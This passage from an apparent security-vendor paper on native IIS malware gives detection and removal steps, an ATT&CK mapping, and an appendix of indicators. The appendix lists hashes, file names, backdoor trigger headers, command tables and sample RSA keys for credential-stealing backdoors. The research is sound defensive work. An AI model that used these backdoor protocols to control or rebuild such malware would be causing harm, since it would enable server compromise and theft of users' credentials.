legitimate, using these methods:\n\n- Verify the modules are signed by trusted providers\n\n- Use IoCs listed in the Appendix of this paper to look for suspicious modules\n\n- [Use YARA rules published on our GitHub repository that we publish with this paper to search for Groups 1–14](https://github.com/eset/malware-ioc/tree/master/badiis)\n\nanalyzed in this report\n\n- [Use the free ESET online scanner to reveal malicious modules](https://www.eset.com/ca/home/online-scanner/)\n\n\n-----\n\nFurthermore, check IIS server logs for indicators of malicious activity, as listed in the IoCs section. Pay\n\nattention to custom HTTP headers that attackers use to instruct their malicious IIS modules. To find the\n\nlocation of IIS server logs, open the Internet Information Services (IIS) Manager to find the Logging tab,\n\n[as shown in Figure 25, or read it from the configuration file [21]:](https://docs.microsoft.com/en-us/iis/configuration/)\n\n**%windir%\\system32\\inetsrv\\config\\ApplicationHost.config.**\n\nBy default, the log files are stored under %SystemDrive%\\inetpub\\logs\\LogFiles on the IIS server.\n\nFigure 25 // Log folder location can be found in Internet Information Services Manager\n\nNote that the IIS software is a built-in Windows feature that can be turned on with administrative\n\n[privileges, even on desktop machines not intended as web servers [22]. Any Windows malware running](https://docs.microsoft.com/en-us/iis/install/installing-iis-7/installing-iis-on-windows-vista-and-windows-7)\n\nwith administrative privileges could enable IIS and use the compromised computer as a proxy (or for\n\nother purposes). If you find IIS running[8] unexpectedly, you can use the steps outlined above to verify\n\nthat there are no malicious native IIS modules installed.\n\n### 5.3 Removing native IIS malware\n\nTo uninstall a malicious native IIS module, follow these steps:\n\n- Remove the module from the list of IIS modules configured on the IIS server. It’s not enough to\n\nremove it from all web applications; it also must be removed globally (see examples later).\n\n- Delete the malicious DLL file from the %windir%\\system32\\inetsrv or the %windir%\\SysWOW64\\inetsrv\n\nfolder.\n\nThe module can be removed manually by editing the IIS configuration, via the IIS Manager GUI, or via\n```\nAppCmd.exe command line tool [1].\n\n```\nFigure 26 illustrates how to remove an IIS module via IIS Manager. Select the Modules tab (1) and navigate\n\nto the module name (2) – in this example, IIS Backdoor installed under C:\\Windows\\System32\\\n```\ninetsrv\\httpaxd.dll. Remove the module from the list of modules installed at the server level (3),\n\n```\nand from the list of configured native modules (4-5).\n\n8 That is, for example, if the World Wide Web Publishing Service service is present, or IIS Worker Process (w3wp.exe) is found running, but the details depend on\nthe OS and IIS versions.\n\n\n-----\n\nFigure 26 // Removing a native IIS module using IIS Manager\n\nThe equivalent action can be performed using the command line tool AppCmd.exe (as also shown in\n\nFigure 27):\n\n```\n%windir%\\System32\\inetsrv\\AppCmd.exe uninstall module <moduleName>\n\n```\n\nAdministrative privileges are required for this action.\n\nFigure 27 // Removing a native IIS module using AppCmd.exe tool\n\nIt is not necessary to restart the IIS server to remove a module; however, the module itself may not\n\nbe the only malicious component on the server. If you do not plan to reinstall the IIS server, it is highly\n\nrecommended to scan for (and remove any) additional malware, make sure the OS and software\n\nare up-to-date, and modify the passwords of all the accounts that have administrative rights on the\n\ncompromised server: otherwise, the attackers could reinstall the malicious IIS module.\n\n\n-----\n\n## 6 CONCLUSION\n\nInternet Information Services web servers have been targeted by various malicious actors, for\n\ncybercrime and cyberespionage alike. The software’s modular architecture, designed to provide\n\nextensibility for web developers, can be a useful tool for the attackers to become a part of the IIS server,\n\nand intercept or modify its traffic.\n\nIn our survey of the current IIS threat landscape, we collected and examined 14 native IIS malware\n\nfamilies, most of them previously undocumented. Overall, the level of sophistication was low, but we did\n\nsee evolution and some tricks that could challenge defenders.\n\nMoreover, it is quite rare for endpoint (and other) security software to run on IIS servers, which makes it\n\neasy for attackers to operate unnoticed for long periods of time. This should be disturbing for all serious\n\nweb portals that want to protect their visitors’ data, including authentication and payment information.\n\nOrganizations that use OWA should also pay attention, as it depends on IIS and could be an interesting\n\ntarget for espionage.\n\nAdmin privileges are required to install native IIS modules, but we found cases where attackers shipped\n\nthe malicious malware as a trojanized IIS module, or spread IIS malware using server exploitation.\n\nThe March 2021 mass-exploitation of the ProxyLogon vulnerability chain was only one example of how\n\nIIS malware can get to interesting data (in that case, government mailboxes).\n\nWhile IIS server threats are not limited to native IIS malware, we believe this paper will be a helpful\n\nstarting point for defenders for understanding, identifying, and removing native IIS malware, and a guide\n\nto our fellow researchers to reverse-engineer this class of threats and understand their common tactics,\n\ntechniques and procedures.\n\n## 7 ACKNOWLEDGEMENTS\n\nWe’d like to acknowledge Marc-Étienne Léveillé and Mathieu Tartare for their work on this\n\ninvestigation.\n\n## 8 REFERENCES\n\n[[1] Mike Volodarsky, “IIS Modules Overview”, Microsoft, 2007. Available: https://docs.microsoft.com/en-us/](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview)\n\n_[iis/get-started/introduction-to-iis/iis-modules-overview.](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview)_\n\n[2] Pierre-Marc Bureau, “Malicious Apache module used for content injection: Linux/Chapro.A”, ESET,\n\n[2012. Available: https://www.welivesecurity.com/2012/12/18/malicious-apache-module-used-for-content-](https://www.welivesecurity.com/2012/12/18/malicious-apache-module-used-for-content-injection-linuxchapro-a/)\n\n_[injection-linuxchapro-a/.](https://www.welivesecurity.com/2012/12/18/malicious-apache-module-used-for-content-injection-linuxchapro-a/)_\n\n[[3] Josh Grunzweig, “The Curious Case of the Malicious IIS Module”, Trustwave, 2013. Available: https://](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)\n\n_[www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/.](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)_\n\n[4] Robert Falcone, “OilRig uses RGDoor IIS Backdoor on Targets in the Middle East”, Unit 42, 2018.\n\n[Available: https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/.](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/)\n\n[[5] Secpulse, “万万没想到，我还是没辜负客户的期待”, 2019. Available: https://www.secpulse.com/](https://www.secpulse.com/archives/113500.html)\n\n_[archives/113500.html.](https://www.secpulse.com/archives/113500.html)_\n\n[[6] TeamT5, “打倒夢靨！電子商務安全不再沉睡！！信用卡與個資竊取案例分析”, 2020. Available: https://](https://teamt5.org/tw/posts/e-commerce-security-a-case-study-on-credit-card-data-breaches/)\n\n_[teamt5.org/tw/posts/e-commerce-security-a-case-study-on-credit-card-data-breaches/.](https://teamt5.org/tw/posts/e-commerce-security-a-case-study-on-credit-card-data-breaches/)_\n\n[7] Matthieu Faou, Mathieu Tartare, Thomas Dupuy, “Exchange servers under siege from at least 10 APT\n\n[groups”, ESET, 2021. Available: https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)\n\n_[apt-groups/.](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)_\n\n\n-----\n\n[[8] Netcraft, “March 2021 Web Server Survey”, 2021. Available: https://news.netcraft.com/archives/category/](https://news.netcraft.com/archives/category/web-server-survey/)\n\n_[web-server-survey/.](https://news.netcraft.com/archives/category/web-server-survey/)_\n\n[[9] W3Techs, “Usage statistics of web servers”, 2021. Available: https://w3techs.com/technologies/overview/](https://w3techs.com/technologies/overview/web_server)\n\n_[web_server.](https://w3techs.com/technologies/overview/web_server)_\n\n[10] Microsoft Press, “Internet Information Services (IIS) 7.0 Resource Kit”, ISBN: 9780735624412, 2008.\n\n[Available in part: https://www.microsoftpressstore.com/articles/article.aspx?p=2231761.](https://www.microsoftpressstore.com/articles/article.aspx?p=2231761)\n\n[11] DEVCORE, “ProxyLogon: The latest pre-authenticated Remote Code Execution vulnerability on\n\n[Microsoft Exchange Server”, 2021. Available: https://proxylogon.com/.](https://proxylogon.com/)\n\n[12] Rajesh Nataraj, “New Lemon Duck variants exploiting Microsoft Exchange Server”, Sophos, 2021.\n\n[Available: https://news.sophos.com/en-us/2021/05/07/new-lemon-duck-variants-exploiting-microsoft-](https://news.sophos.com/en-us/2021/05/07/new-lemon-duck-variants-exploiting-microsoft-exchange-server/)\n\n_[exchange-server/.](https://news.sophos.com/en-us/2021/05/07/new-lemon-duck-variants-exploiting-microsoft-exchange-server/)_\n\n[[13] Mike Volodarsky, “Develop a Native C\\C++ Module for IIS 7.0”, Microsoft, 2007. Available: https://docs.](https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/develop-a-native-cc-module-for-iis)\n\n_[microsoft.com/en-us/iis/develop/runtime-extensibility/develop-a-native-cc-module-for-iis.](https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/develop-a-native-cc-module-for-iis)_\n\n[[14] Reagan Templin, “Introduction to IIS Architectures”, Microsoft, 2007. Available: https://docs.microsoft.](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/introduction-to-iis-architecture#request-processing-in-iis)\n\n_[com/en-us/iis/get-started/introduction-to-iis/introduction-to-iis-architecture#request-processing-in-iis.](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/introduction-to-iis-architecture#request-processing-in-iis)_\n\n[[15] MITRE ATT&CK, “Proxy: External Proxy”. Available: https://attack.mitre.org/versions/v9/techniques/](https://attack.mitre.org/versions/v9/techniques/T1090/002/)\n\n_[T1090/002/.](https://attack.mitre.org/versions/v9/techniques/T1090/002/)_\n\n[[16] MITRE ATT&CK, “Proxy: Internal Proxy”. Available: https://attack.mitre.org/versions/v9/techniques/](https://attack.mitre.org/versions/v9/techniques/T1090/001/)\n\n_[T1090/001/.](https://attack.mitre.org/versions/v9/techniques/T1090/001/)_\n\n[17] Anton Cherepanov, Robert Lipovsky, “GreyEnergy: Updated arsenal of one of the most dangerous\n\n[threat actors”, ESET, 2018. Available: https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-](https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/)\n\n_[dangerous-threat-actors/.](https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/)_\n\n[[18] Kaspersky GReAT, “The Duqu 2.0: Technical Details”, 2015. Available: https://media.kasperskycontenthub.](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07205202/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf)\n\n_[com/wp-content/uploads/sites/43/2018/03/07205202/The_Mystery_of_Duqu_2_0_a_sophisticated_](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07205202/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf)_\n\n_[cyberespionage_actor_returns.pdf.](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07205202/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf)_\n\n[[19] Google, “Webmaster Guidelines”. Available: https://developers.google.com/search/docs/advanced/](https://developers.google.com/search/docs/advanced/guidelines/webmaster-guidelines)\n\n_[guidelines/webmaster-guidelines.](https://developers.google.com/search/docs/advanced/guidelines/webmaster-guidelines)_\n\n[[20] Google, “Cloaking”. Available: https://developers.google.com/search/docs/advanced/guidelines/cloaking.](https://developers.google.com/search/docs/advanced/guidelines/cloaking)\n\n[[21] Microsoft, “Configuration Reference <configuration>“, 2016. Available: https://docs.microsoft.com/en-](https://docs.microsoft.com/en-us/iis/configuration/)\n\n_[us/iis/configuration/.](https://docs.microsoft.com/en-us/iis/configuration/)_\n\n[[22] Microsoft, “Installing IIS 7 on Windows Vista and Windows 7”, 2007. Available: https://docs.microsoft.](https://docs.microsoft.com/en-us/iis/install/installing-iis-7/installing-iis-on-windows-vista-and-windows-7)\n\n_[com/en-us/iis/install/installing-iis-7/installing-iis-on-windows-vista-and-windows-7.](https://docs.microsoft.com/en-us/iis/install/installing-iis-7/installing-iis-on-windows-vista-and-windows-7)_\n\n[[23] OWASP, “OWASP Secure Coding Practices-Quick Reference Guide”. Available: https://owasp.org/](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content)\n\n_[www-project-secure-coding-practices-quick-reference-guide/migrated_content.](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content)_\n\n[[24] OWASP, “OWASP Proactive Controls”. Available: https://owasp.org/www-project-proactive-controls/.](https://owasp.org/www-project-proactive-controls/)\n\n\n-----\n\n## 9 MITRE ATT&CK TECHNIQUES\n\n[This table was built using version 9 of the ATT&CK framework.](https://attack.mitre.org/resources/versions/)\n\n**Tactic** **ID** **Name** **Description**\n\n\nActive Scanning: Vulnerability\nReconnaissance _[T1595.002](https://attack.mitre.org/versions/v9/techniques/T1595/002/)_\nScanning\n\n\nAdversaries that use Group 1 and Group 3 backdoors\nhave performed vulnerability scans to identify\nMicrosoft Exchange servers vulnerable to the\nProxyLogon vulnerability chain.\n\n\nResource\nDevelopment\n\nInitial Access\n\nExecution\n\n\nOperators of Groups 9–14 registered domains for use\n_[T1583.001](https://attack.mitre.org/versions/v9/techniques/T1583/001/)_ Acquire Infrastructure: Domains\nas C&C servers.\n\nOperators of Group 11 have set up their own DNS\n_[T1583.002](https://attack.mitre.org/versions/v9/techniques/T1583/002/)_ Acquire Infrastructure: DNS Server\nserver for use as C&C server.\n\n_[T1587.001](https://attack.mitre.org/versions/v9/techniques/T1587/001/)_ Develop Capabilities: Malware Groups 2–14 are custom made malware families.\n\nGroup 1 is a collection of malware samples derived\n_[T1588.001](https://attack.mitre.org/versions/v9/techniques/T1588/001/)_ Obtain Capabilities: Malware\nfrom a publicly available IIS backdoor named IIS-Raid.\n\nOperators of Group 1 and 3 have obtained and used\n_[T1588.005](https://attack.mitre.org/versions/v9/techniques/T1588/005/)_ Obtain Capabilities: Exploits\nthe exploit for the ProxyLogon vulnerability chain.\n\nAdversaries can spread IIS malware through websites,\n_[T1189](https://attack.mitre.org/versions/v9/techniques/T1189/)_ Drive-by Compromise e.g., Group 12 has been spread as a trojanized IIS\nmodule.\n\nGroup 1 and Group 3 have been spread through the\n_[T1190](https://attack.mitre.org/versions/v9/techniques/T1190/)_ Exploit Public-Facing Application\nProxyLogon vulnerability chain.\n\nCommand and Scripting Interpreter: IIS backdoors can use the Windows command shell to\n_[T1059.003](https://attack.mitre.org/versions/v9/techniques/T1059/003/)_\nWindows Command Shell execute commands on the compromised IIS server.\n\nIIS server (and by extension, malicious IIS modules)\n_[T1569.002](https://attack.mitre.org/versions/v9/techniques/T1569/002/)_ System Services: Service Execution\npersists as a Windows service.\n\n\nPersistence _[T1546](https://attack.mitre.org/versions/v9/techniques/T1546/)_ Event Triggered Execution\n\nDeobfuscate/Decode Files or\n_[T1140](https://attack.mitre.org/versions/v9/techniques/T1140/)_\nInformation\n\n\nMalicious IIS modules are loaded by IIS Worker Process\n(w3wp.exe) when the IIS server receives an inbound\nHTTP request.\n\nIIS malware uses various techniques to obfuscate\nits code or strings, such as UPX packing or string\nencryption.\n\n\nGroup 7 has the ability to neutralize logging of attacker\n_[T1070](https://attack.mitre.org/versions/v9/techniques/T1070/)_ Indicator Removal on Host\nrequests on the IIS server.\n\nIndicator Removal on Host:\n_[T1070.006](https://attack.mitre.org/versions/v9/techniques/T1070/006/)_ Group 7 has a command to modify file timestamps.\nTimestomp\n\n\nDefense Evasion\n\n\nMasquerading: Match Legitimate\n_[T1036.005](https://attack.mitre.org/versions/v9/techniques/T1036/005/)_\nName or Location\n\n\nIIS malware families have used various names to\nmimic legitimate files, for example dir.dll and\n```\nMicrosoft.Exchange.Clients.OwaAuth.dll.\n\n```\n\nIIS malware families use variations of Caesar and XOR\n_[T1027](https://attack.mitre.org/versions/v9/techniques/T1027/)_ Obfuscated Files or Information\nciphers to encrypt their strings and configuration.\n\nObfuscated Files or Information:\n_[T1027.002](https://attack.mitre.org/versions/v9/techniques/T1027/002/)_ Some Group 12 samples are partially packed with UPX.\nSoftware Packing\n\n\nCredential Access _[T1056](https://attack.mitre.org/versions/v9/techniques/T1056/)_ Input Capture\n\n\nIIS infostealers intercept network traffic between\nthe IIS server and its clients, to collect sensitive\ninformation such as passwords (Group 1) or credit card\ndetails (Groups 5-6).\n\n\n-----\n\n_[T1119](https://attack.mitre.org/versions/v9/techniques/T1119/)_ Automated Collection\n\n\nIIS infostealers can be configured to automatically\ncollect information from inbound HTTP requests, such\nas passwords (Group 1) or credit card details (Groups\n5-6).\n\n\nCollection\n\nCommand and\nControl\n\n\n_[T1071.004](https://attack.mitre.org/versions/v9/techniques/T1071/004/)_ Application Layer Protocol: DNS Group 11 uses DNS to obtain configuration.\n\nGroup 7 sends data in a fake PNG file (a PNG header\n_[T1001](https://attack.mitre.org/versions/v9/techniques/T1001/)_ Data Obfuscation followed by non-image data), in an attempt to hide its\nC&C traffic within regular network traffic.\n\nGroups 1, 2 and 4 use base64 encoding for C&C\n_[T1132.001](https://attack.mitre.org/versions/v9/techniques/T1132/001/)_ Data Encoding: Standard Encoding\ncommunication.\n\nEncrypted Channel: Symmetric Groups 2 and 7 use AES-CBC to encrypt C&C\n_[T1573.001](https://attack.mitre.org/versions/v9/techniques/T1573/001/)_\nCryptography communication.\n\nEncrypted Channel: Asymmetric Group 2 uses RSA to encrypt an AES session key, which\n_[T1573.002](https://attack.mitre.org/versions/v9/techniques/T1573/002/)_\nCryptography is used to encrypt the C&C communication.\n\nIIS backdoors (e.g., Group 7) can upload additional\n_[T1105](https://attack.mitre.org/versions/v9/techniques/T1105/)_ Ingress Tool Transfer\ntools to the compromised IIS server.\n\nIIS proxies (e.g., Group 9) can redirect traffic between\n_[T1090.001](https://attack.mitre.org/versions/v9/techniques/T1090/001/)_ Proxy: Internal Proxy hosts in the compromised environment and the C&C\nserver.\n\nIIS proxies (e.g., Group 9) can redirect C&C traffic\n_[T1090.002](https://attack.mitre.org/versions/v9/techniques/T1090/002/)_ Proxy: External Proxy\nbetween a compromised host and the real C&C server.\n\n\nIIS malware (e.g. Groups 7–8) can collect and exfiltrate\n_[T1005](https://attack.mitre.org/versions/v9/techniques/T1005/)_ Data from Local System\nfiles from the compromised IIS server.\n\nIIS infostealers (e.g. Group 5) can use local files to\n_[T1074.001](https://attack.mitre.org/versions/v9/techniques/T1074/001/)_ Data Staged: Local Data Staging\nstage collected information.\n\n\nApplication Layer Protocol: Web\n_[T1071.001](https://attack.mitre.org/versions/v9/techniques/T1071/001/)_\nProtocols\n\n\nAdversaries send HTTP requests to the compromised\nIIS server to control IIS malware. Furthermore, Groups\n9–14 use an alternative HTTP to obtain configuration\nand for C&C communication.\n\n\nGroup 1, 5 and 6 use their C&C channels to exfiltrate\nExfiltration _[T1041](https://attack.mitre.org/versions/v9/techniques/T1041/)_ Exfiltration Over C2 Channel collected data: HTTP requests are sent by the\nadversary to the compromised IIS server.\n\n\nData Manipulation: Transmitted\n_[T1565.002](https://attack.mitre.org/versions/v9/techniques/T1565/002/)_\nData Manipulation\n\n\nGroups 9–14 modify content served by the\ncompromised server to legitimate users or search\nengine crawlers.\n\n\nImpact\n\n\nIIS malware can modify content served by websites\n_[T1491](https://attack.mitre.org/versions/v9/techniques/T1491/)_ Defacement\nthat are hosted by the compromised IIS server.\n\n\n-----\n\n## APPENDIX: ANALYSIS AND INDICATORS OF COMPROMISE (IOCS)\n\nThis section serves as reference material, and contains detailed analyses of all malware families\n\nexamined for the purposes of this research.\n\nFor the cases where a malware family has already been publicly analyzed, we provide basic structured\n\ninformation about its functionality and implementation, and refer the reader to the appropriate report\n\nfor the full analysis.\n\nThis section also contains indicators of compromise (IoCs) extracted from all the analyzed samples. The\n\n[aggregated IoCs for all malware families are also published on our GitHub repository.](https://github.com/eset/malware-ioc/tree/master/badiis)\n\n### Group 1 (IIS-Raid derivatives)\n\n[Group 1 comprises malware samples based on the source code of IIS-Raid, a simple IIS backdoor publicly](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)\n\navailable since February 2020. We have seen this backdoor customized and reused by various threat\n\nactors, from as early as July 2020, and then deployed massively via the ProxyLogon vulnerability chain\n\nsince March 2021, as detailed earlier, in Section 3.3.\n\n#### ESET detection names\n\nWin64/BadIIS.S, Win64/BadIIS.T, Win64/BadIIS.V, Win64/BadIIS.W, Win64/BadIIS.X\n\n#### Implemented handlers\n```\nCHttpModule::OnSendResponse\n\n Features\n\n```\n**Feature** **Comment**\n\nIntercepts regular traffic between the compromised server and its\nInfostealer\nclients, targeting credential information.\n\n\nBackdoor\n\n\nSupported backdoor commands:\n\n - Run a shell command\n\n - Upload a file\n\n - Download a file\n\n\n#### Infostealer mode\n\nGroup 1 malware parses all incoming HTTP requests, targeting benign requests with sensitive\n\ninformation – this means requests with the string password or Transport-Security (different per\n\nsample) present in cleartext in the HTTP body.\n\nIn such cases, the HTTP request body is logged to a log file with a hardcoded path (see IoCs subsection),\n\nin this format:\n```\n   dd/mm/yyyy hh:mm:ss | <fullHttpRequestBody>\n\n```\nThis log file can be exfiltrated via a backdoor command.\n\n#### Backdoor mode\n\nThe backdoor functionality of this malware can be triggered via special attacker-crafted requests, with\n\ntwo specific HTTP headers present:\n\n\n-----\n\n- A password header set to a hardcoded password\n\n- A command header present with data in this format: <cmd>|<arg>\n\nPassword and command header combinations vary across the samples, for example X-Password and\n```\nX-Chrome-Variations, or Strict-Transport-Security and X-Content-Type-Options. All\n\n```\nof these combinations are listed in the IoCs subsection; however, we have chosen not to publish the\n\npasswords that can be used to control the backdoors.\n\nThe backdoor uses information from the HTTP headers to execute one of the supported commands, as\n\nlisted in Table 5. After the command is executed, the malware modifies the IIS response to return the\n\ncommand’s result to the attacker. Generally, the same HTTP header that was used to pass command\n\narguments is used for the return value (for example, X-Chrome-Variations).\n\nThe C&C communication channel is base64 encoded; CryptBinaryToStringA and\n```\nCryptStringToBinaryA Windows API functions are used for encoding/decoding.\n\n```\nTable 5 // Backdoor commands for Group 1 (not all commands are supported by all samples)\n\n**Command** **Arguments** **Command description** **Return value**\n\nExecutes the command as a new C:\\\n`CMD` shell command `Windows\\system32\\cmd.exe /c` command output\nprocess.\n\n`PIN` N/A Connectivity check `PONG`\n\n\n`INJ` base64-encoded code\n\n\nBase64 decodes the code, executes\nit in a new thread, or injects it via\nProcess Hollowing to a legitimate C:\\\n```\nWindows\\System32\\credwiz.exe\n\n```\nprocess.\n\n```\nDONE\n\n```\n\nfile content or No\n`DMP` N/A Reads the content of the log file.\n```\n                                                Creds Found\n\n```\nfilename, base64- Dumps the file content into a file with\n```\n      UPL DONE\n```\nencoded file content the specified name.\n\n`DOW` filename Reads the content of the specified file. file content\n\nother N/A N/A `INVALID COMMAND`\n\n#### IoCs\n\nSHA-1\n```\n1176B51814B59526B02AA7F3C88334A0256D0370\n58E23A74AC78D223505C774A20D0C1DE1070BE3A\n66739373D34DE7002C80A5E2AF660E9EA6FF6E7F\n68B6E7A48CD9B894A076C4D10A64E98F1C7366A3\n6AC1CB3E04E45894DFFFC5D113068B28923508AA\n77B9E64F4C2B7DF6AAC00D21A5EB071EEFC25596\n8A0885AE43FA9057A46611E8171EA2DDC5DA7330\n8B8BBF897C49A01D82610F3834CC77111D310161\n9DFA1EC8704A697F9847C0B8DFF41BF5EE289FC1\nAA9BA493CB9E9FA6F9599C513EDBCBEE84ECECD6\nB24E67BDB53B380AC97249B489AADE3BFDAF9E43\nBBFC53367730C270C680EE5E7860F824102082C3\n\n```\n\n-----\n\n```\nBF2A9C216A1DA23BBDA004101A2E2F5E8D8D3D23\nC2F9740A73CCC13A868E1E3150F43BDDB54CC66A\nECAEA1D9D4E84FDDF61C87AB64256EAC7863D3A7\nF449C31AAB9EC0E6C6B2C336DEB83ADE6DAD53FD\nF8EF3168DD4C07D0C2E36D4143C9DDA8E1F6E306\n\n```\nFilenames and paths\n```\nauthmd4.dll\ncachport.dll\nhttpapxd.dll\niiscom.dll\nIISNET4.dll\nIIS-Raid-Backdoor.dll\nIIS-Trojan.dll\nIISModule.dll\nMicrosoft.Exchange.Clients.OwaAuth.dll\n\n```\nsvcfilter.dll\n```\nC:\\Windows\\Temp\\AAD30E0F.tmp\nC:\\Windows\\Temp\\creds.db\nC:\\Windows\\Temp\\log.tmp\nC:\\Windows\\Temp\\thumbs.db\nDllResolve.db\n\n```\nNetwork indicators (HTTP header combinations)\n```\nCOM_InterProt, X-Chrome-Variations\nCookie, X-FFEServer\nSense-Pwd, X-Chrome-Variations\nStrict-Transport-Security, X-Content-Type-Options\nX-BLOG, X-BlogEngine\nX-Cache, X-Via\nX-Password, X-Chrome-Variations\nXXXYYY-Ref, X-Chrome-Variations\n\n### Group 2\n\n```\nGroup 2 is a simple IIS backdoor. Its most interesting feature is the mature use of cryptography for its\n\n[C&C communication, using a statically linked Crypto++ library. The first known instance of this backdoor](https://github.com/weidai11/cryptopp)\n\nis from May 2018; we don’t have any information about its targets.\n\n#### ESET detection names\n\nWin64/BadIIS.D, Win64/BadIIS.L\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest\n\n```\n\n-----\n\n#### Features\n\n**Feature** **Comment**\n\n\nBackdoor\n\n#### Backdoor mode\n\n\nSupported backdoor commands:\n\n - Run a shell command\n\n - Upload a file\n\n - Download a file\n\n\nBackdoor mode can be activated via a special attacker-crafted request, with a hardcoded password\n\npresent at offset 0x250 of the raw HTTP request (obtained via IHttpRequest::GetRawHttpRequest).\n\nThe backdoor command and parameters are included in the HTTP request body, as a series of key-value\n\npairs delimited by &. The request body is parsed using the following regular expression:\n```\n   ([\\w+%]+)=([^&]*)\n\n```\nAccepted are four keys: a (action, backdoor command), c (shell command), k (session key) and f\n\n(filename). Table 6 lists all the possible backdoor commands and their arguments.\n\nNote that the c and f parameters are encrypted with AES-CBC and base64 encoded, with the following\n\nhybrid scheme used for the encryption:\n\n- The k parameter holds an RSA-encrypted session key\n\n- The c and f parameters are encrypted with AES-CBC, using the session key\n\nA similar scheme is used for communication in the other direction – the malware generates a session\n\nkey to encrypt the data (such as command output), and then encrypts the key using RSA. This data is\n\nthen added to the body of the HTTP response to the attacker’s request. In the case where a file is being\n\nexfiltrated from the IIS server by this backdoor command, the HTTP response has the Content-Type\n\nheader set to attachment.\n\nNote that a different RSA key is used for both directions of the communication; that’s why the malware\n\nembeds a private RSA key (from one key pair, the attacker having the corresponding public key), as well\n\nas a public RSA key (from a second pair, the attacker having the private key).\n\nTable 6 // Group 2 backdoor commands\n\n**Command** **Argument** **Argument** **Argument**\n**Command description** **Return value**\n**(a value)** **(c value)** **(k value)** **(f value)**\n\n\nbase64-encoded,\nencrypted command\noutput\n\n```\nr\n\n```\n\nbase64encoded,\nencrypted shell\ncommand\n\n\nRuns the specified shell\nsession key N/A\ncommand.\n\n\n`u` N/A session key\n\n`d` N/A session key\n\n\nbase64encoded,\nencrypted\nfilename\n\nbase64encoded,\nencrypted\nfilename\n\n\nCreates a file with the specified\n```\n                 OK\n```\nname and content.\n\n\nDownloads the specified file\nfrom the compromised IIS\nserver.\n\n\nbase64-encoded,\nencrypted file content\n\n\n-----\n\nIn an older version of this backdoor[9], no encryption was used and the backdoor command and\n\narguments were included in the URL path in this format: ([\\w+%]+)=([^!]*). For that version of the\n\nbackdoor, the accepted parameters are action (command name) and v1 (command argument), with\n\nan optional argument that can be included in the HTTP request body. The commands supported by this\n\nolder version are listed in Table 7.\n\nTable 7 // Group 2 backdoor commands (older version)\n\nCommand Argument (HTTP\nArgument (v1 value) Command description Return value\n(action value) request body)\n\nRuns the specified shell base64-encoded\n`rc` base64-encoded command command. command output\n\nbase64-encoded file Creates a file with the\n`uf` base64-encoded filename `OK`\ncontent specified name and content.\n\n\nDownloads the specified file\n`df` base64-encoded filename - from the compromised IIS\nserver.\n\n#### IoCs\n\nSHA-1\n```\n338B6E464874A52E61BC5B8FCAA94D66FE7E4141\n481543A5985B947989691C01C478721AED5B0F2D\nAB934E9A0BFCEFB2DF295E1E9ADBB3FFD1F15B82\nE2EAA585E69150029487080E445E1240D918ED1D\n\n```\nFilenames and paths\n```\niisddos.dll\niisred.dll\niissup.dll\n\n#### RSA public keys\n\n```\n\nbase64-encoded,\nencrypted file content\n\n```\n-----BEGIN PUBLIC KEY----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5VGPiBWYOHbmeM8xOR4KhahM5FRRph6cSIkUj0q4Aoeh\ntDGeNtEhrJsseY8lORhyh1NRcz4vCGMLapgkLOpT8dWjYpvu5NXPDQmsVwQxViJpF/3Qw5KHg09CM8TfwyR\nCbwpZ9MHGCQVNUyWOdw2FD/ViMnSGyLGvHajyVAqM6BwIDAQAB\n-----END PUBLIC KEY---------BEGIN PUBLIC KEY----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCzMKJzL9vCPjsDdFaxAOUAyZeEg+DzS9f4iEVNdS9bk+l\nYErzMVHWNnET6zKt+AH7sCZUdHvSBUkETX9k6a3kJWkWdecfV1MTpRcCBFIm/VandARn2WFSEr/hzlEF6tA\n0QmD4OVe1J791DvfBKbDEybXJNc5+xsO/Cql5UNrIWLwIDAQAB\n-----END PUBLIC KEY---------BEGIN PUBLIC KEY----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDi7W5fyEi6rlaB8CTxIcL63KO5iGW4dGBqkaN9Fgyv3b\nQhvVCupmtAdd8y8W89Ct1JQeTfwgEDF+Ld0A4mHxZCJKCJe+YPW+SijXaJ+YMgnTNk39izYLiRiwrVfjxhC\n7sNmMRBxxBAoDAAStPbLu99j/WJ4IKS5zmbPecxCPh+wIDAQAB\n-----END PUBLIC KEY----\n```\n9 SHA-1: AB934E9A0BFCEFB2DF295E1E9ADBB3FFD1F15B82\n\n\n-----\n\n#### RSA private keys\n```\n-----BEGIN PRIVATE 